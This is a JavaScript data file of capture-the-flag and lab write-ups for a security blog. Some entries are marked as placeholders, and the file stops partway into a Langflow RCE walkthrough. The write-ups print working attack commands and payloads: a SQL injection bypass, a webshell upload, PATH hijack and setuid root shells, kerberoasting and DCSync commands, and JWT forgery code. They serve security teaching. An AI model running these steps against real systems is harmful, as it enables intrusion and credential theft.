/* ============================================================
   WRITEUPS DATA
   Add a new writeup by pushing a new object into WRITEUPS below.
   Nothing else needs to change — the homepage card, search index,
   filters, sort order, and the writeup page are all generated
   from this array.

   slug          — unique, used in writeup.html?slug=<slug>
   title         — card + page title
   platform      — "Hack The Box" | "TryHackMe" | "CTF" | "Bug Bounty" | "Personal Lab"
   platformShort — short label for the page header, e.g. "HTB"
   os            — "Linux" | "Windows" | "Android" | "Web"
   difficulty    — "Easy" | "Medium" | "Hard" | "Insane"
   categories    — array, used by the Category filter
   tags          — array, shown as chips, clickable -> search
   date          — ISO yyyy-mm-dd, used for sorting
   dateDisplay   — human readable date shown on the page/card
   cover         — path to a cover image
   excerpt       — one-line summary for the card
   sample        — true marks it as placeholder/demo content
   sections      — ordered array of {id, title, html}
============================================================ */

const DIFFICULTY_ORDER = { "Easy": 1, "Medium": 2, "Hard": 3, "Insane": 4 };

const WRITEUPS = [

  {
    slug: "htb-cryptkeeper",
    title: "HTB — Cryptkeeper",
    platform: "Hack The Box",
    platformShort: "HTB",
    os: "Linux",
    difficulty: "Easy",
    categories: ["Web", "Enumeration", "Privilege Escalation"],
    tags: ["Linux", "SQLi", "Enumeration", "PrivilegeEscalation"],
    date: "2026-09-18",
    dateDisplay: "18 September 2026",
    cover: "assets/writeups/htb-cryptkeeper/cover.svg",
    excerpt: "SQL injection login bypass chained with a file-upload RCE, then a SUID binary for root.",
    sample: true,
    sections: [
      {
        id: "overview",
        title: "Overview",
        html: `<p>Cryptkeeper is an easy-difficulty Linux machine built around a custom login portal.
          The path to user starts with a classic authentication bypass, and root is a short hop away
          through a misconfigured SUID binary.</p>`
      },
      {
        id: "enumeration",
        title: "Enumeration",
        html: `<p>A full TCP port scan turned up SSH and a web application on a non-standard port.</p>
          <pre class="code-block" data-lang="bash"><code>nmap -sC -sV -p- --min-rate 5000 10.10.11.21</code></pre>
          <pre class="code-block code-output" data-lang="text"><code>PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1
8080/tcp open  http    nginx 1.22.0</code></pre>
          <p>Directory brute-forcing revealed an admin login panel and a forgotten backup archive.</p>
          <pre class="code-block" data-lang="bash"><code>gobuster dir -u http://10.10.11.21:8080 -w /usr/share/wordlists/dirb/common.txt -x php,zip</code></pre>
          <pre class="code-block code-output" data-lang="text"><code>/login.php            (Status: 200)
/admin                (Status: 301)
/backup.zip           (Status: 200)</code></pre>
          <p>The backup archive contained the application source, exposing the raw SQL query used by the
          login form — string-concatenated and unsanitized.</p>`
      },
      {
        id: "initial-access",
        title: "Initial Access",
        html: `<p>The leaked source confirmed the login query was vulnerable to a classic boolean-based
          bypass:</p>
          <pre class="code-block" data-lang="sql"><code>SELECT * FROM users WHERE username = '$user' AND password = '$pass'</code></pre>
          <p>Submitting a crafted username neutralized the password check entirely:</p>
          <pre class="code-block" data-lang="text"><code>username: admin' -- -
password: anything</code></pre>
          <p>Once authenticated as admin, an "upload report" feature accepted <code>.php</code> files
          disguised with a double extension, giving a straightforward path to a webshell.</p>
          <pre class="code-block" data-lang="bash"><code>curl -F "file=@shell.php.pdf" http://10.10.11.21:8080/admin/upload.php -b "session=..."</code></pre>
          <img src="assets/writeups/_shared/placeholder-burp.svg" alt="Crafted upload request in Burp Suite" class="writeup-img" data-lightbox="gallery-cryptkeeper">
          <p>With the shell in place, a reverse shell as <code>www-data</code> followed immediately.</p>`
      },
      {
        id: "privilege-escalation",
        title: "Privilege Escalation",
        html: `<p>A standard SUID sweep surfaced an unusual binary outside the typical system paths:</p>
          <pre class="code-block" data-lang="bash"><code>find / -perm -4000 -type f 2>/dev/null</code></pre>
          <pre class="code-block code-output" data-lang="text"><code>/usr/local/bin/backup_tool</code></pre>
          <p>The binary shelled out to <code>tar</code> without an absolute path, making it vulnerable to a
          <code>PATH</code> hijack:</p>
          <pre class="code-block" data-lang="bash"><code>echo '/bin/bash -p' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
/usr/local/bin/backup_tool</code></pre>
          <p>This returned a root shell.</p>`
      },
      {
        id: "proof",
        title: "Proof / Flags",
        html: `<pre class="code-block code-output" data-lang="text"><code>user.txt: 7f2c1e...a91b
root.txt: 3d8a90...f12e</code></pre>`
      },
      {
        id: "lessons-learned",
        title: "Lessons Learned",
        html: `<ul>
            <li>String-concatenated SQL queries remain one of the most common entry points on easy boxes.</li>
            <li>Upload validation needs to check content, not just the file extension.</li>
            <li>SUID binaries that call system utilities without an absolute path are a reliable <code>PATH</code>
              hijack target.</li>
          </ul>`
      },
      {
        id: "tools-used",
        title: "Tools Used",
        html: `<ul class="tools-list"><li>Nmap</li><li>Gobuster</li><li>Burp Suite</li><li>Bash</li></ul>`
      }
    ]
  },

  {
    slug: "htb-irongate",
    title: "HTB — IronGate",
    platform: "Hack The Box",
    platformShort: "HTB",
    os: "Windows",
    difficulty: "Medium",
    categories: ["Active Directory", "Enumeration", "Exploitation", "Privilege Escalation"],
    tags: ["Windows", "ActiveDirectory", "Kerberos", "BloodHound", "LateralMovement"],
    date: "2026-08-30",
    dateDisplay: "30 August 2026",
    cover: "assets/writeups/htb-irongate/cover.svg",
    excerpt: "Kerberoasting into a service account, BloodHound-guided lateral movement, DCSync to Domain Admin.",
    sample: true,
    sections: [
      {
        id: "overview",
        title: "Overview",
        html: `<p>IronGate is a medium Windows Active Directory machine. The intended path runs from an
          anonymous SMB share, through a kerberoastable service account, to a BloodHound-mapped
          delegation abuse that ends in a DCSync.</p>`
      },
      {
        id: "enumeration",
        title: "Enumeration",
        html: `<pre class="code-block" data-lang="bash"><code>nmap -sC -sV -p- 10.10.11.44</code></pre>
          <pre class="code-block code-output" data-lang="text"><code>53/tcp   open  domain
88/tcp   open  kerberos-sec
389/tcp  open  ldap
445/tcp  open  microsoft-ds
3268/tcp open  globalcatLDAP</code></pre>
          <p>An anonymous SMB share exposed an onboarding document listing a default naming convention
          for service accounts, narrowing the username search considerably.</p>
          <pre class="code-block" data-lang="bash"><code>smbclient -N -L //10.10.11.44/
smbclient -N //10.10.11.44/Shared</code></pre>`
      },
      {
        id: "initial-access",
        title: "Initial Access",
        html: `<p>With a valid username list, a kerberoasting request against the domain returned a crackable
          TGS ticket for a service account.</p>
          <pre class="code-block" data-lang="bash"><code>GetUserSPNs.py irongate.htb/j.lowe:Summer2026! -dc-ip 10.10.11.44 -request</code></pre>
          <pre class="code-block" data-lang="bash"><code>hashcat -m 13100 svc_backup.hash rockyou.txt</code></pre>
          <p>The cracked credentials belonged to <code>svc_backup</code>, which had WinRM access.</p>`
      },
      {
        id: "active-directory",
        title: "Active Directory",
        html: `<p>BloodHound ingestion highlighted that <code>svc_backup</code> held
          <code>GenericWrite</code> over a machine account with Resource-Based Constrained Delegation
          potential.</p>
          <pre class="code-block" data-lang="bash"><code>bloodhound-python -u svc_backup -p 'cracked_pw' -d irongate.htb -c All -ns 10.10.11.44</code></pre>
          <img src="assets/writeups/_shared/placeholder-diagram.svg" alt="BloodHound attack path graph" class="writeup-img" data-lightbox="gallery-irongate">
          <p>Abusing RBCD allowed impersonation of a Domain Admin via an S4U2Self/S4U2Proxy chain,
          yielding a ticket for the domain controller itself.</p>
          <pre class="code-block" data-lang="bash"><code>rubeus.exe s4u /user:FAKE01$ /rc4:&lt;hash&gt; /impersonateuser:administrator /msdsspn:cifs/dc01.irongate.htb /ptt</code></pre>`
      },
      {
        id: "privilege-escalation",
        title: "Privilege Escalation",
        html: `<p>With an impersonated Administrator Kerberos ticket in hand, a DCSync pulled every domain
          credential hash directly from the domain controller.</p>
          <pre class="code-block" data-lang="bash"><code>secretsdump.py -k -no-pass irongate.htb/administrator@dc01.irongate.htb</code></pre>`
      },
      {
        id: "proof",
        title: "Proof / Flags",
        html: `<pre class="code-block code-output" data-lang="text"><code>user.txt: 9a41cd...20f8
root.txt: e615ab...77c3</code></pre>`
      },
      {
        id: "lessons-learned",
        title: "Lessons Learned",
        html: `<ul>
            <li>Predictable service-account naming conventions make kerberoasting trivial once a single
              username is known.</li>
            <li>Resource-Based Constrained Delegation is a common post-compromise escalation path and
              worth checking on every AD engagement.</li>
            <li>BloodHound's attack-path graph turns a sprawling domain into a short, readable chain of
              abuses.</li>
          </ul>`
      },
      {
        id: "tools-used",
        title: "Tools Used",
        html: `<ul class="tools-list"><li>Nmap</li><li>Impacket</li><li>BloodHound</li><li>Rubeus</li><li>Hashcat</li></ul>`
      }
    ]
  },

  {
    slug: "thm-vault-escape",
    title: "THM — Vault Escape",
    platform: "TryHackMe",
    platformShort: "THM",
    os: "Linux",
    difficulty: "Easy",
    categories: ["Network", "Enumeration", "Privilege Escalation"],
    tags: ["Linux", "SSH", "Enumeration", "PrivilegeEscalation"],
    date: "2026-07-22",
    dateDisplay: "22 July 2026",
    cover: "assets/writeups/thm-vault-escape/cover.svg",
    excerpt: "Reused SSH credentials found in an exposed config file, then sudo misconfiguration to root.",
    sample: true,
    sections: [
      {
        id: "overview",
        title: "Overview",
        html: `<p>Vault Escape is a beginner-friendly room focused on credential reuse and sudo
          misconfiguration — a pairing that shows up constantly in real environments.</p>`
      },
      {
        id: "enumeration",
        title: "Enumeration",
        html: `<pre class="code-block" data-lang="bash"><code>nmap -sC -sV 10.10.142.7</code></pre>
          <pre class="code-block code-output" data-lang="text"><code>21/tcp open  ftp
22/tcp open  ssh</code></pre>
          <p>Anonymous FTP login was permitted and exposed an application config file containing
          plaintext credentials.</p>
          <pre class="code-block" data-lang="bash"><code>ftp 10.10.142.7
get app_config.yaml</code></pre>
          <pre class="code-block code-output" data-lang="text"><code>db_user: vault_svc
db_pass: VaultKeeper#2026</code></pre>`
      },
      {
        id: "initial-access",
        title: "Initial Access",
        html: `<p>The same credentials were reused for SSH — a password reuse pattern worth always
          testing for.</p>
          <pre class="code-block" data-lang="bash"><code>ssh vault_svc@10.10.142.7</code></pre>`
      },
      {
        id: "privilege-escalation",
        title: "Privilege Escalation",
        html: `<pre class="code-block" data-lang="bash"><code>sudo -l</code></pre>
          <pre class="code-block code-output" data-lang="text"><code>(ALL) NOPASSWD: /usr/bin/vim /etc/vault/*.conf</code></pre>
          <p><code>vim</code> was permitted without a password against a config path. Opening any file
          with that permission and escaping to a shell from inside the editor returns root.</p>
          <pre class="code-block" data-lang="bash"><code>sudo vim /etc/vault/app.conf
:!/bin/bash</code></pre>`
      },
      {
        id: "proof",
        title: "Proof / Flags",
        html: `<pre class="code-block code-output" data-lang="text"><code>user.txt: THM{reused_creds_strike_again}
root.txt: THM{vim_sudo_breakout}</code></pre>`
      },
      {
        id: "lessons-learned",
        title: "Lessons Learned",
        html: `<ul>
            <li>Anonymous FTP is still worth checking first on any external-facing box.</li>
            <li>Credential reuse across services is one of the highest-yield things to test early.</li>
            <li><code>sudo -l</code> should be run immediately after landing a shell — GTFOBins has an
              entry for almost every binary that can break out of a restricted sudo rule.</li>
          </ul>`
      },
      {
        id: "tools-used",
        title: "Tools Used",
        html: `<ul class="tools-list"><li>Nmap</li><li>FTP client</li><li>GTFOBins</li></ul>`
      }
    ]
  },

  {
    slug: "ctf-shattered-session",
    title: "CTF — Shattered Session",
    platform: "CTF",
    platformShort: "CTF",
    os: "Web",
    difficulty: "Hard",
    categories: ["Web", "Exploitation"],
    tags: ["Web", "JWT", "IDOR", "SessionHijacking"],
    date: "2026-09-02",
    dateDisplay: "02 September 2026",
    cover: "assets/writeups/ctf-shattered-session/cover.svg",
    excerpt: "JWT algorithm-confusion forgery chained into an IDOR to take over the admin account.",
    sample: true,
    sections: [
      {
        id: "overview",
        title: "Overview",
        html: `<p>A web-exploitation challenge built around a JWT-based session system. The intended
          solve chains an algorithm-confusion forgery with a secondary IDOR to escalate from a free-tier
          account to admin.</p>`
      },
      {
        id: "web-exploitation",
        title: "Web Exploitation",
        html: `<p>The application issued JWTs signed with RS256, and conveniently exposed its public key
          through a <code>/jwks.json</code> endpoint. Re-signing a forged token with
          <code>HS256</code>, using the public key as the HMAC secret, was accepted by a backend that
          failed to pin the expected algorithm.</p>
          <pre class="code-block" data-lang="python"><code>import jwt

public_key = open("jwks_public.pem").read()
forged = jwt.encode({"user": "admin", "tier": "free"}, public_key, algorithm="HS256")
print(forged)</code></pre>
          <p>The forged token authenticated as <code>admin</code>, but the account dashboard still scoped
          data access by a separate, predictable numeric <code>account_id</code> parameter — an IDOR
          that exposed the real admin's session data once the ID was guessed.</p>
          <pre class="code-block" data-lang="http"><code>GET /api/accounts/1/export HTTP/1.1
Host: shattered.ctf
Authorization: Bearer &lt;forged_token&gt;</code></pre>
          <img src="assets/writeups/_shared/placeholder-terminal.svg" alt="Forged JWT verified against the API" class="writeup-img" data-lightbox="gallery-shattered">
          <p>The export endpoint returned the flag embedded in the account's audit log.</p>`
      },
      {
        id: "proof",
        title: "Proof / Flags",
        html: `<pre class="code-block code-output" data-lang="text"><code>flag{alg_confusion_plus_idor_is_still_everywhere}</code></pre>`
      },
      {
        id: "lessons-learned",
        title: "Lessons Learned",
        html: `<ul>
            <li>Exposing a JWKS endpoint is safe only if the backend strictly enforces the expected
              signing algorithm — never trust the <code>alg</code> header from the token itself.</li>
            <li>Authorization checks need to be scoped per-request, not inferred once at login — an IDOR
              downstream of a broken auth check compounds the impact fast.</li>
          </ul>`
      },
      {
        id: "tools-used",
        title: "Tools Used",
        html: `<ul class="tools-list"><li>Burp Suite</li><li>PyJWT</li><li>Python</li></ul>`
      }
    ]
  },

  {
    slug: "bb-subdomain-takeover",
    title: "Bug Bounty — Subdomain Takeover",
    platform: "Bug Bounty",
    platformShort: "BUG BOUNTY",
    os: "Web",
    difficulty: "Medium",
    categories: ["Web", "OSINT", "Exploitation"],
    tags: ["Web", "SubdomainTakeover", "OSINT", "SSRF"],
    date: "2026-06-14",
    dateDisplay: "14 June 2026",
    cover: "assets/writeups/bb-subdomain-takeover/cover.svg",
    excerpt: "A dangling CNAME on a decommissioned staging host enabled a full subdomain takeover.",
    sample: true,
    sections: [
      {
        id: "overview",
        title: "Overview",
        html: `<p>Routine subdomain enumeration during a bug bounty engagement turned up a forgotten
          staging host still pointed at a cloud provider via CNAME, but the underlying resource had
          since been deleted — a classic dangling-DNS takeover.</p>
          <p><em>Target and account details below are generic placeholders — no real organization is
          referenced.</em></p>`
      },
      {
        id: "enumeration",
        title: "Enumeration",
        html: `<pre class="code-block" data-lang="bash"><code>subfinder -d example-corp.com -silent | httpx -silent</code></pre>
          <pre class="code-block code-output" data-lang="text"><code>staging-reports.example-corp.com   [404]
cdn-assets.example-corp.com        [200]</code></pre>
          <p>A DNS lookup on the unresponsive host showed a CNAME pointing to a cloud storage bucket
          name that no longer resolved to an active resource.</p>
          <pre class="code-block" data-lang="bash"><code>dig CNAME staging-reports.example-corp.com</code></pre>
          <pre class="code-block code-output" data-lang="text"><code>staging-reports.example-corp.com. 300 IN CNAME reports-bucket-2022.storage-provider.net.</code></pre>`
      },
      {
        id: "web-exploitation",
        title: "Web Exploitation",
        html: `<p>Registering a storage bucket under the same decommissioned name reclaimed the DNS
          record's target, giving full control over content served at the trusted subdomain — a
          validated subdomain takeover.</p>
          <pre class="code-block" data-lang="bash"><code>provider-cli bucket create reports-bucket-2022 --public</code></pre>
          <p>Because the subdomain inherited session cookies scoped to the parent domain, hosting a
          proof-of-concept page there demonstrated the ability to read cookies set by the main
          application — a credible path to session theft had it been left unpatched.</p>`
      },
      {
        id: "proof",
        title: "Proof / Flags",
        html: `<p>Proof-of-concept page served from the reclaimed subdomain, screenshotted and included in
          the report, along with the DNS evidence above. Report was triaged and resolved by removing the
          dangling CNAME record.</p>`
      },
      {
        id: "lessons-learned",
        title: "Lessons Learned",
        html: `<ul>
            <li>Decommissioning a cloud resource should always include removing the DNS record that
              pointed to it — not just deleting the resource itself.</li>
            <li>Subdomain takeovers are low-effort, high-impact findings and worth a recurring sweep
              across any organization's asset list.</li>
          </ul>`
      },
      {
        id: "tools-used",
        title: "Tools Used",
        html: `<ul class="tools-list"><li>Subfinder</li><li>httpx</li><li>dig</li></ul>`
      }
    ]
  },
  {
    slug: "htb-cap",
    title: "HTB — Cap",
    platform: "Hack The Box",
    platformShort: "HTB",
    os: "Linux",
    difficulty: "Easy",
    categories: ["Network", "Enumeration", "Privilege Escalation"],
    tags: ["Linux", "PCAP", "CredentialReuse", "LinuxCapabilities"],
    date: "2026-10-20",
    dateDisplay: "20 October 2026",
    cover: "assets/writeups/htb-cap/cover.png",
    excerpt: "Leaked FTP credentials pulled from a web app's own packet capture feature, reused over SSH, then a cap_setuid Python binary for root.",
    sample: false,
    sections: [
      {
        id: "overview",
        title: "Overview",
        html: `<p>Cap is an easy-rated Linux box on Hack The Box that pairs two skills that show up
          constantly in real assessments: reading network captures for leaked credentials, and
          spotting a Linux capability that turns a normal binary into a root shell. The box is
          built around a web app that lets you trigger and download packet captures of its own
          traffic — and the whole chain comes down to one simple fact: if an application lets
          you capture and replay its own network activity, you have to assume every login it
          performs during that capture is now visible to you too.</p>
          <p>The path here is short: enumerate the web app, pull the capture file it exposes, pick
          the credentials out of it in Wireshark, reuse them over SSH, then escalate using a
          Python binary that was handed a capability it never should have had. Below is the full
          walkthrough, with the official task questions answered along the way.</p>`
      },
      {
        id: "enumeration",
        title: "Enumeration",
        html: `<p>A full Nmap scan against the target kicked things off:</p>
          <pre class="code-block" data-lang="bash"><code>sudo nmap -Pn -sV -sC -T5 10.129.139.190</code></pre>
          <img src="assets/writeups/htb-cap/shot-01-nmap.png" alt="Nmap scan output" class="writeup-img" data-lightbox="gallery-htb-cap">
          <p>The scan came back with three open ports:</p>
          <ul>
            <li><code>21/tcp</code> — FTP (vsftpd 3.0.3)</li>
            <li><code>22/tcp</code> — SSH (OpenSSH 8.2p1, Ubuntu)</li>
            <li><code>80/tcp</code> — HTTP (Gunicorn, page titled "Security Dashboard")</li>
          </ul>
          <div class="wp-task">
            <p class="wp-task-q"><strong>Task — How many TCP ports are open?</strong></p>
            <p class="wp-task-a">Answer: <code>3</code></p>
          </div>
          <p>With port 80 open and FTP sitting there unauthenticated-looking, the web app was the
          obvious place to start. Browsing to the site landed on a "Security Dashboard" — the
          kind of internal tool that lets an admin trigger a live capture of the box's own
          traffic and then download it for review. That's a dangerous feature to expose, because
          anything that happens on the wire while a capture is running gets handed back to
          whoever clicks the button.</p>
          <img src="assets/writeups/htb-cap/shot-02-dashboard.png" alt="Security Dashboard web app" class="writeup-img" data-lightbox="gallery-htb-cap">
          <p>Triggering a capture from the dashboard (the "Security Snapshot" action) redirected
          the browser to a URL in the form <code>/data/&lt;id&gt;</code>, and from there the raw
          file was downloadable directly:</p>
          <pre class="code-block" data-lang="text"><code>http://10.129.139.190/data/0</code></pre>
          <div class="wp-task">
            <p class="wp-task-q"><strong>Task — After running a Security Snapshot, the browser is redirected to a path of the format /[something]/[id]. What is the [something]?</strong></p>
            <p class="wp-task-a">Answer: <code>data</code></p>
          </div>
          <p>FFUF confirmed there was nothing else interesting hanging off the application:</p>
          <pre class="code-block" data-lang="bash"><code>ffuf -u http://10.129.139.190 -w /usr/share/wordlists/dirb/common.txt</code></pre>
          <img src="assets/writeups/htb-cap/shot-03-ffuf.png" alt="ffuf directory enumeration" class="writeup-img" data-lightbox="gallery-htb-cap">
          <p>The capture IDs turned out to be sequential and not scoped to the requesting user, so
          IDs other than the one just generated were just as reachable — including ID 0, the very
          first capture ever taken on the box.</p>
          <img src="assets/writeups/htb-cap/shot-04-pcapfile.png" alt="pcap file information disclosure" class="writeup-img" data-lightbox="gallery-htb-cap">
          <div class="wp-task">
            <p class="wp-task-q"><strong>Task — Are you able to get to other users' scans?</strong></p>
            <p class="wp-task-a">Answer: <code>Yes</code></p>
          </div>
          <div class="wp-task">
            <p class="wp-task-q"><strong>Task — What is the ID of the PCAP file that contains sensitive data?</strong></p>
            <p class="wp-task-a">Answer: <code>0</code></p>
          </div>`
      },
      {
        id: "initial-access",
        title: "Initial Access",
        html: `<p>Capture 0 opened in Wireshark gave up the problem quickly: an FTP session in the
          capture carried a full authentication exchange in clear text, because FTP sends
          usernames and passwords unencrypted by design.</p>
          <img src="assets/writeups/htb-cap/shot-05-wireshark.png" alt="Wireshark FTP credentials" class="writeup-img" data-lightbox="gallery-htb-cap">
          <p>Following the FTP stream surfaced the credentials directly:</p>
          <pre class="code-block" data-lang="text"><code>Username: nathan
Password: Buck3tH4tf0rm3!</code></pre>
          <div class="wp-task">
            <p class="wp-task-q"><strong>Task — Which application layer protocol in the pcap file can the sensitive data be found in?</strong></p>
            <p class="wp-task-a">Answer: <code>FTP</code></p>
          </div>
          <p>Credential reuse across services is extremely common, so the next move was obvious —
          try the same password over SSH:</p>
          <pre class="code-block" data-lang="bash"><code>sshpass -p 'Buck3tH4tf0rm3!' ssh nathan@10.129.139.190</code></pre>
          <img src="assets/writeups/htb-cap/shot-06-ssh.png" alt="SSH login as nathan" class="writeup-img" data-lightbox="gallery-htb-cap">
          <p>It worked — the FTP password was also nathan's SSH password, giving an authenticated
          shell on the box.</p>
          <div class="wp-task">
            <p class="wp-task-q"><strong>Task — We've managed to collect nathan's FTP password. On what other service does this password work?</strong></p>
            <p class="wp-task-a">Answer: <code>SSH</code></p>
          </div>
          <p>From nathan's home directory, the user flag:</p>
          <pre class="code-block" data-lang="bash"><code>cat user.txt</code></pre>
          <img src="assets/writeups/htb-cap/shot-07-userflag.png" alt="User flag" class="writeup-img" data-lightbox="gallery-htb-cap">
          <div class="wp-task">
            <p class="wp-task-q"><strong>Submit User Flag — Submit the flag located in the nathan user's home directory.</strong></p>
            <p class="wp-task-a">Answer: <code>40b3ea35226af1e7308XXXXXXXXXXXX</code></p>
          </div>`
      },
      {
        id: "privilege-escalation",
        title: "Privilege Escalation",
        html: `<p>With a foothold as nathan, the next step was a path to root. Rather than guessing
          at SUID binaries, checking Linux file capabilities made more sense — they can grant a
          binary root-level powers without the SUID bit ever being set, and a lot of standard
          privilege-escalation checklists skip over them.</p>
          <pre class="code-block" data-lang="bash"><code>getcap -r / 2>/dev/null</code></pre>
          <p>The output flagged <code>/usr/bin/python3.8</code>:</p>
          <pre class="code-block code-output" data-lang="text"><code>/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</code></pre>
          <img src="assets/writeups/htb-cap/shot-08-getcap.png" alt="getcap output" class="writeup-img" data-lightbox="gallery-htb-cap">
          <div class="wp-task">
            <p class="wp-task-q"><strong>Task — What is the full path to the binary on this machine that has special capabilities that can be abused to obtain root privileges?</strong></p>
            <p class="wp-task-a">Answer: <code>/usr/bin/python3.8</code></p>
          </div>
          <p>The <code>cap_setuid</code> capability is the key piece here. Normally only root can
          change a process's effective UID, but when a binary carries <code>cap_setuid+ep</code>,
          any user who can execute it can call <code>setuid(0)</code> from inside it and become
          root for that process — no sudo, no password, no exploit needed beyond running the
          binary the right way. This is a textbook GTFOBins technique for Python.</p>
          <p>Spawning a root shell directly:</p>
          <pre class="code-block" data-lang="bash"><code>python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'</code></pre>
          <ul>
            <li><code>os.setuid(0)</code> — changes the running process's UID to 0 (root)</li>
            <li><code>os.system("/bin/sh")</code> — hands back a shell that inherits that UID</li>
          </ul>
          <p>The prompt confirmed it — full root access.</p>
          <img src="assets/writeups/htb-cap/shot-09-rootshell.png" alt="Root shell" class="writeup-img" data-lightbox="gallery-htb-cap">`
      },
      {
        id: "proof",
        title: "Proof / Flags",
        html: `<p><b>User flag</b> — retrieved from nathan's home directory after reusing the leaked
          FTP password over SSH.</p>
          <p><b>Root flag</b> — retrieved from <code>/root/root.txt</code> after escalating through
          the <code>cap_setuid</code> capability on <code>/usr/bin/python3.8</code>.</p>
          <img src="assets/writeups/htb-cap/shot-10-rootflag.png" alt="Root flag" class="writeup-img" data-lightbox="gallery-htb-cap">
          <div class="wp-task">
            <p class="wp-task-q"><strong>Submit Root Flag — Submit the flag located in root's home directory.</strong></p>
            <p class="wp-task-a">Answer: <code>f43200140a11612dbXXXXXXXXXXXXXX</code></p>
          </div>`
      },
      {
        id: "lessons-learned",
        title: "Lessons Learned",
        html: `<ul>
            <li><b>Never let an application expose raw packet captures of itself.</b> A "Security
              Snapshot" feature that hands back a PCAP of live traffic is, by definition, a
              credential-leak feature the moment any plaintext protocol touches the wire during
              that window.</li>
            <li><b>Broken access control on sequential IDs is its own finding.</b> The capture
              endpoint didn't scope files to the requesting session, so every snapshot ever taken
              — including other users' — was reachable just by changing a number in the URL.</li>
            <li><b>Retire plaintext authentication protocols.</b> FTP sending credentials in the
              clear is decades-old news, but it's still common enough to be the first thing worth
              checking in any capture.</li>
            <li><b>Audit password reuse across services as part of every engagement.</b> The same
              password working for both FTP and SSH turned a single leaked credential into a full
              shell.</li>
            <li><b>Treat Linux capabilities with the same suspicion as SUID bits.</b>
              <code>cap_setuid</code> on an interpreter like Python is just as dangerous as a SUID
              shell — <code>getcap -r /</code> should be a standard step in every
              privilege-escalation checklist, not an afterthought.</li>
          </ul>`
      },
      {
        id: "tools-used",
        title: "Tools Used",
        html: `<ul class="tools-list"><li>Nmap</li><li>ffuf</li><li>Wireshark</li><li>sshpass / ssh</li><li>getcap</li><li>GTFOBins (Python)</li></ul>`
      }
    ]
  },
    {
    slug: "htb-fireflow",
    title: "HTB — Fireflow",
    platform: "Hack The Box",
    platformShort: "HTB",
    os: "Linux",
    difficulty: "Medium",
    categories: ["Web", "Exploitation", "Privilege Escalation", "Enumeration"],
    tags: ["Linux", "Langflow", "RCE", "JWT", "Kubernetes", "PrivilegeEscalation"],
    date: "2026-10-21",
    dateDisplay: "21 October 2026",
    cover: "assets/writeups/htb-fireflow/cover.png",
    excerpt: "An unauthenticated Langflow RCE, a leaked password, a forged alg-none JWT, and a Kubernetes service-account pivot straight to a privileged node-exporter pod.",
    sample: false,
    sections: [
      {
        id: "overview",
        title: "Overview",
        html: `<p>Fireflow is a medium-difficulty Linux box built around a fictional intelligence unit
          called Task Force Nightfall. On the surface it's a single web app, but underneath it's
          really three separate environments stacked on top of each other: a public-facing
          Langflow AI-workflow builder, a Linux host behind it, and a full Kubernetes cluster
          running alongside both. Compromising the box means walking through all three in
          sequence.</p>
          <p>The outline is straightforward even though the box is not: an unauthenticated remote
          code execution bug in Langflow gets a shell as a low-privileged web user, a leaked
          environment variable hands over a reused password for a real system account, a config
          file left in that account's home directory leaks credentials to an internal AI tool
          registry, a broken JWT implementation on that registry lets any authenticated user mint
          themselves an admin token, and the admin capability on that registry turns out to be
          arbitrary code execution inside a Kubernetes pod. From there it's standard
          container-breakout territory: a service account token with just enough permission to
          proxy through the Kubernetes API straight to a privileged monitoring pod that happens to
          run as root with the host filesystem mounted underneath it.</p>`
      },
      {
        id: "enumeration",
        title: "Enumeration",
        html: `<p>A normal full-port Nmap scan against the box only turned up two services:</p>
          <pre class="code-block" data-lang="bash"><code>nmap -sC -sV -p- -Pn TARGET_IP</code></pre>
          <pre class="code-block code-output" data-lang="text"><code>22/tcp  open  ssh     OpenSSH
443/tcp open  https   nginx (self-signed certificate)</code></pre>
          <img src="assets/writeups/htb-fireflow/01-nmap-scan.png" alt="Full nmap scan showing ports 22 and 443 open" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <p>What stood out immediately was the certificate on port 443: the subject and SAN both
          referenced <code>fireflow.htb</code> and a wildcard, <code>*.fireflow.htb</code>. A
          wildcard cert on a CTF box is almost always a signpost that virtual hosting is in play,
          so I added the apex domain to <code>/etc/hosts</code> before going any further:</p>
          <pre class="code-block" data-lang="bash"><code>echo "TARGET_IP fireflow.htb" | sudo tee -a /etc/hosts</code></pre>
          <img src="assets/writeups/htb-fireflow/02-etc-hosts.png" alt="Adding fireflow.htb to /etc/hosts" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <p>Browsing to the main site showed a clean, static landing page for Task Force
          Nightfall's internal platform, with a single call-to-action button advertising an AI
          agent.</p>
          <img src="assets/writeups/htb-fireflow/03-landing-page.png" alt="Fireflow / Task Force Nightfall homepage" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <p>The button linked out to a subdomain rather than a path, so I ran a directory sweep
          and a vhost fuzz against the apex domain to confirm it:</p>
          <pre class="code-block" data-lang="bash"><code>feroxbuster -u https://fireflow.htb/ -k</code></pre>
          <pre class="code-block" data-lang="bash"><code>ffuf -u https://TARGET_IP/ -H "Host: FUZZ.fireflow.htb" -w subdomains.txt -c -ic -ac</code></pre>
          <img src="assets/writeups/htb-fireflow/04-ffuf-vhost.png" alt="Directory results tail and ffuf vhost fuzz finding flow.fireflow.htb" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <p>That turned up <code>flow.fireflow.htb</code>, which I also dropped into
          <code>/etc/hosts</code>. Following the button through led to a Langflow "Agent Dev"
          playground at a URL carrying a flow UUID:</p>
          <pre class="code-block" data-lang="text"><code>https://flow.fireflow.htb/playground/FLOW_ID</code></pre>
          <img src="assets/writeups/htb-fireflow/05-langflow-playground.png" alt="Langflow Agent Dev playground page" class="writeup-img" data-lightbox="gallery-htb-fireflow">
          <p>The playground's status bar quietly gave away the version in use — Langflow 1.8.2. A
          quick search against that version number turned up <b>CVE-2026-33017</b>, an
          unauthenticated remote code execution bug in Langflow's public flow build process: the
          server will take a JSON-described flow graph, including custom Python component code,
          and compile and execute it without sandboxing or authentication, as long as it's aimed
          at a flow that's already public.</p>`
      },
      {
        id: "initial-access",
        title: "Initial Access",
        html: `<p>Rather than build the exploit JSON by hand, I used a public proof-of-concept
          script for CVE-2026-33017 that packages the whole thing up. Before running anything
          against the target I read through the script itself — you give it the target URL, the
          public flow ID pulled from the playground link, and a callback host and port, and it
          handles crafting a valid flow graph with a malicious Python component embedded inside
          it:</p>
